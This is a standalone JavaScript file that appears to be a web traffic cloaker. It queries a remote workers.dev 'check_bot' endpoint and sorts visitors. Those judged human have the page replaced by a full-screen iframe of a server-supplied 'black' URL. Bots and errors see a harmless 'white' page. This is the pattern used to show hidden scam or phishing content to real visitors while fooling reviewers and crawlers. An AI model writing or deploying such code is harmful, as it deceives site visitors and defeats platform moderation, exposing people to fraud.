const createLoader = () => {
  const frame = document.createElement('iframe');
  frame.id = 'load_frame';
  frame.src = `frameLoad.html`;
  frame.frameBorder = 0;
  frame.width = '100%';
  frame.height = '100%';
  frame.style.position = 'fixed';
  frame.style.top = 0;
  frame.style.left = 0;
  frame.style.width = '100%';
  frame.style.height = '100%';
  frame.style.zIndex = 9999;

  const body = document.querySelector('body');
  if (body) {
    body.prepend(frame);
  }
};

const showWhite = () => {
  const body = document.body;
  const html = document.documentElement;

  if (body) {
    body.classList.remove('hidden');
    body.removeAttribute('hidden');
    body.style.overflow = 'auto';
  }
  if (html) {
    html.style.overflow = 'auto';
  }


  document.querySelectorAll('style').forEach(styleTag => {
    if (styleTag.textContent && styleTag.textContent.includes('overflow: hidden')) {
      styleTag.textContent = styleTag.textContent.replace(/overflow:\s*hidden;?/g, 'overflow: auto !important;');
    }
  });

  const preload = document.querySelector('#load_frame');
  if (preload) preload.remove();
};


const showBlack = (blackUrl) => {
  const body = document.body;


  body.classList.remove('hidden');
  body.removeAttribute('hidden');


  body.innerHTML = '';
  body.style.margin = '0';
  body.style.padding = '0';
  body.style.overflow = 'hidden';

  const frame = document.createElement('iframe');
  frame.setAttribute('src', blackUrl);
  frame.setAttribute('id', 'wrapper_frame');
  frame.style = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    border: none;
    z-index: 10000;
    display: block;
  `;
  body.appendChild(frame);


  setTimeout(() => {
    const preload = document.querySelector('#load_frame');
    if (preload) preload.remove();
  }, 300);
};



createLoader();

window.addEventListener('DOMContentLoaded', () => {

  const qs = new URLSearchParams(location.search);
  if (qs.has('white')) { console.log('force white'); showWhite(); return; }
  if (qs.has('black')) { 
    const u = qs.get('black') || '';
    console.log('force black', u);
    if (u) { showBlack(u); return; }
  }

  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
    .then(res => res.json())
    .then(res => {
      console.log('check_bot response:', res);
   
      if (res?.code === 200 && res.result === false && res.url) {
        showBlack(res.url + '/wvS95k'); 
      } else {

        setTimeout(showWhite, 100);
      }
    })
    .catch(err => {
      console.error('error resp:', err);
      showWhite();
    });
});
